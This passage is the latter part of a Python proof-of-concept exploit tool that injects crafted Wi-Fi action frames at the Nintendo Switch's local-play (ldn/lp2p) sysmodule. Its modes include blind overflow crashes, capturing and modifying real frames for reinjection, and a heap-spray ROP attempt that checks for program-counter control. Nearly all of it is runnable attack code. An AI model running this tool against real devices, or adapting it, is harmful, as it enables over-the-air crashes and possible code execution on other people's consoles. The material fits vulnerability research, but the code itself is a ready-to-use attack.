    print(f"    Alternating spray and overflow frames")
    print(f"    HTTP check every 50 frames")

    start = time.time()
    total_sent = 0
    total_overflow = 0
    crash_detected = False
    crash_time = None
    batch = 50

    try:
        while time.time() - start < duration:
            # Send mix: 40 spray + 10 overflow per batch
            for j in range(batch):
                if j % 5 == 4:
                    # Every 5th frame is the overflow
                    if inject_frame(iface, rop_frame):
                        total_overflow += 1
                else:
                    inject_frame(iface, spray_frame)
                total_sent += 1
                time.sleep(delay)

            elapsed = time.time() - start
            alive = check_http()
            status = "UP" if alive else "DOWN"
            print(f"    [{elapsed:5.1f}s] sent={total_sent} overflow={total_overflow} http={status}")

            if not alive and not crash_detected:
                ping_ok = check_ping()
                if not ping_ok:
                    crash_detected = True
                    crash_time = time.time() - start
                    print(f"\n  *** CRASH/HANG DETECTED at {crash_time:.1f}s! ***")
                    print(f"  *** HTTP down + ping down ***")

                    # Send more overflow frames in case sysmodule restarts
                    for _ in range(50):
                        inject_frame(iface, rop_frame)
                        time.sleep(0.002)
                    total_sent += 50
                    total_overflow += 50
                    break
                else:
                    print(f"    HTTP down but ping OK — not crashed yet")

    except KeyboardInterrupt:
        print(f"\n[*] Stopped by user")

    # Phase 3: Detect outcome
    print(f"\n[*] Phase 3: Outcome detection")
    if crash_detected:
        # Wait and check if sysmodule recovers (crash) or stays down (hang)
        print(f"    Waiting 15s to check recovery...")
        time.sleep(15)
        recovered_http = check_http()
        recovered_ping = check_ping()
        if recovered_ping:
            outcome = "CRASH_RECOVERED"
            print(f"    Ping recovered: sysmodule restarted (normal crash)")
        else:
            outcome = "HANG_PERMANENT"
            print(f"    Still down: possible controlled PC (infinite loop)!")
    else:
        outcome = "NO_CRASH"
        print(f"    No crash detected — function returned cleanly")
        if rop_target == "clean":
            print(f"    *** CLEAN RETURN = PC CONTROL CONFIRMED ***")

    print(f"\n{'=' * 60}")
    print(f"  Results:")
    print(f"    Target:         {rop_target} (0x{target_offset:05x})")
    print(f"    Spray sent:     {spray_sent}")
    print(f"    Overflow sent:  {total_overflow}")
    print(f"    Total sent:     {total_sent}")
    print(f"    Duration:       {time.time() - start:.1f}s")
    print(f"    Outcome:        {outcome}")
    if crash_detected:
        print(f"    Crash time:     {crash_time:.1f}s")
    print(f"{'=' * 60}")

    EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)
    path = EVIDENCE_DIR / f"rop_attempt_{rop_target}.json"
    with open(path, "w") as f:
        json.dump({
            "mode": "rop",
            "target": rop_target,
            "target_offset": f"0x{target_offset:05x}",
            "lr_partial": f"0x{target_lo:04x}",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "vulnerability": "CVE-2026-82079 stack-based buffer overflow",
            "interface": iface,
            "freq": freq,
            "src_mac": src_mac, "dst_mac": dst_mac, "bssid": bssid,
            "payload_size": f"0x{payload_size:04x}",
            "spray_body_size": f"0x{len(spray_body):04x}",
            "rop_body_size": f"0x{len(rop_body):04x}",
            "spray_sent": spray_sent,
            "overflow_sent": total_overflow,
            "total_sent": total_sent,
            "duration": duration,
            "outcome": outcome,
            "crash_detected": crash_detected,
            "crash_time": crash_time,
        }, f, indent=2)
    print(f"[+] Evidence: {path}")
    return outcome


def mode_crash(iface, args):
    """Crash mode: inject overflow frame to trigger the heap overflow.

    WARNING: This will crash the ldn sysmodule on the target Switch.
    The Switch will recover by restarting the sysmodule (error 2162-xxxx).
    """
    print("=" * 60)
    print("  ACTION FRAME HEAP OVERFLOW PoC")
    print("  Target: Nintendo Switch ldn sysmodule")
    print("  Vulnerability: FUN_710003b470 unchecked memcpy")
    print("  FW: 22.5.0 (unfixed)")
    print("=" * 60)

    src_mac = args.src_mac or "aa:bb:cc:dd:ee:ff"
    dst_mac = args.dst_mac or "ff:ff:ff:ff:ff:ff"
    bssid = args.bssid or "ff:ff:ff:ff:ff:ff"

    set_channel(iface, args.channel)

    overflow_size = args.overflow_size or 0x1000
    proto = args.protocol_type
    proto_names = {1: "plaintext (BLOCKED by parse)", 2: "AES-GCM", 3: "alt (EXPLOITABLE)"}
    print(f"\n[*] Building overflow frame:")
    print(f"    protocol type:      0x{proto:02x} ({proto_names.get(proto, 'unknown')})")
    print(f"    payload_size field: 0x{overflow_size:04x} ({overflow_size})")
    print(f"    buffer available:   0x{DEST_BUFFER_SIZE:04x} ({DEST_BUFFER_SIZE})")
    print(f"    overflow bytes:     0x{overflow_size - DEST_BUFFER_SIZE:04x} ({overflow_size - DEST_BUFFER_SIZE})")

    if proto == PROTOCOL_TYPE_ALT:
        print(f"    parse path:         type 3 — NO payload_size bounds check, NO SHA-256 hash")
        print(f"    member layout:      max=1, count=1, member_data=0x0000 (passes FUN_7100046010)")
        print(f"    group/session:      all zeroed (matches fresh packet context)")
        body = build_type3_overflow_body(overflow_size, b"\x41")
    else:
        if proto == PROTOCOL_TYPE_PLAINTEXT:
            print(f"    WARNING:            type 1 parse caps payload_size < 0x181 — CANNOT overflow!")
        print(f"    SHA-256 hash:       embedded (plain SHA-256, no HMAC key)")
        print(f"    hash_length:        0x0500 (required >= 0x500 by gate 3)")
        print(f"    group/session:      all zeroed (matches fresh packet context)")
        body = build_overflow_body(overflow_size, b"\x41", protocol_type=proto)

    # MUST use ADVERTISE (0x0101) — parse gate requires frame_type==0x0101.
    # 0x0100 (DATA) fails the frame_type check → parse returns non-zero → memcpy skipped.
    # 0x0102 is excluded from the vulnerable ring buffer entirely.
    lp2p_full = build_lp2p_frame(LP2P_FRAME_TYPE_ADVERTISE, body=body)

    print(f"    frame_type:         0x0101 (ADVERTISE — required by parse gate)")
    print(f"    lp2p frame total:   {len(lp2p_full)} bytes (12 header + {len(body)} body)")
    print(f"    body size:          {len(body)} bytes (0x{len(body):04x})")

    frame = build_action_frame(src_mac, dst_mac, bssid, LP2P_FRAME_TYPE_ADVERTISE, body)

    count = args.count or 10
    delay = args.delay or 0.01

    print(f"\n[*] Injecting {count} overflow frames (delay={delay}s)...")

    results = {"injected": 0, "failed": 0}
    for i in range(count):
        if inject_frame(iface, frame):
            results["injected"] += 1
            if (i + 1) % 10 == 0:
                print(f"    Sent {i + 1}/{count}")
        else:
            results["failed"] += 1
        time.sleep(delay)

    print(f"\n[+] Injection complete: {results['injected']} sent, {results['failed']} failed")
    print(f"[*] If Switch was in lp2p mode, check for error 2162-xxxx")

    EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)
    path = EVIDENCE_DIR / "crash_attempt.json"
    with open(path, "w") as f:
        json.dump({
            "mode": "crash",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "interface": iface,
            "channel": args.channel,
            "src_mac": src_mac,
            "dst_mac": dst_mac,
            "bssid": bssid,
            "overflow_size": overflow_size,
            "protocol_type": f"0x{proto:02x} ({proto_names.get(proto, 'unknown')})",
            "frame_type": f"0x{LP2P_FRAME_TYPE_ADVERTISE:04x}",
            "body_size": len(body),
            "count": count,
            "results": results,
        }, f, indent=2)
    print(f"[+] Evidence: {path}")


def mode_replay(iface, args):
    """Replay mode: capture legitimate lp2p frames, modify payload_size, reinject.

    Strategy: parse returns 0 only when the frame matches existing session context.
    By capturing a real frame and modifying only the overflow-relevant fields
    (payload_size at body+0x1DA and payload data at body+0x1DC), we keep all
    the authentication/session fields intact, so parse succeeds → memcpy → overflow.
    """
    try:
        from scapy.all import sniff, sendp, Dot11, Raw, RadioTap
    except ImportError:
        print("[!] scapy required: pip install scapy")
        return

    print("=" * 60)
    print("  REPLAY + MODIFY ATTACK")
    print("  Capture → modify payload_size → reinject")
    print("=" * 60)

    captured = []

    def capture_handler(pkt):
        if pkt.haslayer(Dot11) and pkt.haslayer(Raw):
            raw = pkt[Raw].load
            if len(raw) > 11 and raw[0] == 0x7F and raw[1:4] == NINTENDO_OUI and raw[4] == 0x04:
                ft = struct.unpack(">H", raw[6:8])[0] if len(raw) > 8 else 0
                if ft != FRAME_TYPE_EXCLUDED:
                    src = pkt[Dot11].addr2 or "unknown"
                    dst = pkt[Dot11].addr1 or "unknown"
                    bssid = pkt[Dot11].addr3 or "unknown"
                    captured.append({
                        "pkt": pkt,
                        "raw": raw,
                        "src": src,
                        "dst": dst,
                        "bssid": bssid,
                        "frame_type": ft,
                        "body_len": len(raw) - 12,
                    })
                    print(f"  [CAPTURED] src={src} type=0x{ft:04x} body={len(raw)-12}B (total {len(captured)})")

    print(f"\n[*] Phase 1: Capturing lp2p frames on channel {args.channel}...")
    print(f"[*] Switch must be active in lp2p mode (Send to Smartphone, local play)")
    set_channel(iface, args.channel)

    capture_duration = args.duration or 15
    sniff(iface=iface, prn=capture_handler, timeout=capture_duration,
          monitor=True, store=False)

    if not captured:
        print("[!] No lp2p frames captured. Try different channel or ensure Switch is active.")
        return

    best = max(captured, key=lambda c: c["body_len"])
    print(f"\n[+] Best frame: src={best['src']} type=0x{best['frame_type']:04x} body={best['body_len']}B")

    raw = bytearray(best["raw"])
    body_start = 12
    body = raw[body_start:]

    if len(body) > BODY_PAYLOAD_SIZE_OFFSET + 2:
        orig_size = struct.unpack(">H", body[BODY_PAYLOAD_SIZE_OFFSET:BODY_PAYLOAD_SIZE_OFFSET+2])[0]
        print(f"    Original payload_size: 0x{orig_size:04x}")
    else:
        print(f"    Body too short ({len(body)}) to contain payload_size field at 0x{BODY_PAYLOAD_SIZE_OFFSET:x}")
        print(f"    Padding body to required size...")
        needed = BODY_PAYLOAD_DATA_OFFSET + 0x100
        body = body + bytes(needed - len(body))

    overflow_size = args.overflow_size or 0x1000
    struct.pack_into(">H", body, BODY_PAYLOAD_SIZE_OFFSET, overflow_size)

    payload_space = len(body) - BODY_PAYLOAD_DATA_OFFSET
    if payload_space > 0:
        pattern = (b"\x41" * payload_space)
        body[BODY_PAYLOAD_DATA_OFFSET:BODY_PAYLOAD_DATA_OFFSET + payload_space] = pattern[:payload_space]

    modified_raw = bytes(raw[:body_start]) + bytes(body)

    print(f"\n[*] Phase 2: Injecting modified frame...")
    print(f"    payload_size: 0x{overflow_size:04x} (overflow: 0x{max(0, overflow_size - DEST_BUFFER_SIZE):04x})")
    print(f"    Total frame: {len(modified_raw)}B")

    src_mac = best["src"]
    dst_mac = best["dst"]
    bssid = best["bssid"]

    frame = (
        RadioTap() /
        Dot11(
            type=0,
            subtype=13,
            addr1=dst_mac,
            addr2=src_mac,
            addr3=bssid,
        ) /
        Raw(load=modified_raw)
    )

    count = args.count or 20
    delay = args.delay or 0.05

    print(f"    Sending {count} copies (delay={delay}s)...")

    results = {"injected": 0, "failed": 0}
    for i in range(count):
        try:
            sendp(frame, iface=iface, verbose=False)
            results["injected"] += 1
        except Exception as e:
            results["failed"] += 1
            if results["failed"] == 1:
                print(f"  [!] First injection error: {e}")
        time.sleep(delay)

    print(f"\n[+] Replay complete: {results['injected']} sent, {results['failed']} failed")
    print(f"[*] If Switch was processing lp2p frames, check for error 2162-xxxx")

    EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)
    path = EVIDENCE_DIR / "replay_attempt.json"
    with open(path, "w") as f:
        json.dump({
            "mode": "replay",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "interface": iface,
            "channel": args.channel,
            "captured_frames": len(captured),
            "best_frame": {
                "src": best["src"],
                "dst": best["dst"],
                "bssid": best["bssid"],
                "frame_type": f"0x{best['frame_type']:04x}",
                "body_len": best["body_len"],
            },
            "overflow_size": overflow_size,
            "count": count,
            "results": results,
        }, f, indent=2)
    print(f"[+] Evidence: {path}")


def main():
    parser = argparse.ArgumentParser(
        description="lp2p Action Frame Injection — SendActionFrame Heap Overflow PoC"
    )
    parser.add_argument("--iface", required=True, help="WiFi interface (must support monitor mode)")
    parser.add_argument("--mode", required=True, choices=["scan", "probe", "crash", "replay", "join", "rop"],
                       help="scan=listen, probe=test injection, crash=blind overflow, replay=capture+modify+reinject, join=target stack overflow in join handler, rop=heap spray + ROP exploit")
    parser.add_argument("--channel", type=int, default=6, help="WiFi channel (default: 6)")
    parser.add_argument("--duration", type=int, default=30, help="Scan/capture duration in seconds")
    parser.add_argument("--src-mac", help="Source MAC (default: random)")
    parser.add_argument("--dst-mac", help="Destination MAC (default: broadcast)")
    parser.add_argument("--bssid", help="BSSID (default: broadcast)")
    parser.add_argument("--overflow-size", type=int, help="Overflow payload_size (default: 0x1000)")
    parser.add_argument("--protocol-type", type=int, default=3,
                       help="Protocol type byte at body[0x21]: 1=plaintext (BLOCKED by parse), 2=GCM, 3=alt/EXPLOITABLE (default: 3)")
    parser.add_argument("--count", type=int, help="Number of frames to inject (default: 10)")
    parser.add_argument("--delay", type=float, help="Delay between frames in seconds (default: 0.01)")
    parser.add_argument("--monitor", action="store_true",
                       help="Use monitor mode (needed for non-Intel adapters). Default: NL80211 on managed interface.")
    parser.add_argument("--rop-target", default="hang",
                       help="ROP target: clean=original LR, hang=ret loop, crash=bad addr, or 0xNNNNN hex offset (default: hang)")

    args = parser.parse_args()

    if args.mode in ("probe", "crash", "replay", "join", "rop") and args.monitor:
        if not setup_monitor_mode(args.iface):
            print("[!] Cannot set monitor mode. Trying NL80211 on managed interface.")

    if args.mode == "scan":
        if not setup_monitor_mode(args.iface):
            sys.exit(1)
        mode_scan(args.iface, args)
    elif args.mode == "probe":
        mode_probe(args.iface, args)
    elif args.mode == "crash":
        mode_crash(args.iface, args)
    elif args.mode == "replay":
        mode_replay(args.iface, args)
    elif args.mode == "join":
        mode_join(args.iface, args)
    elif args.mode == "rop":
        mode_rop(args.iface, args)


if __name__ == "__main__":
    main()
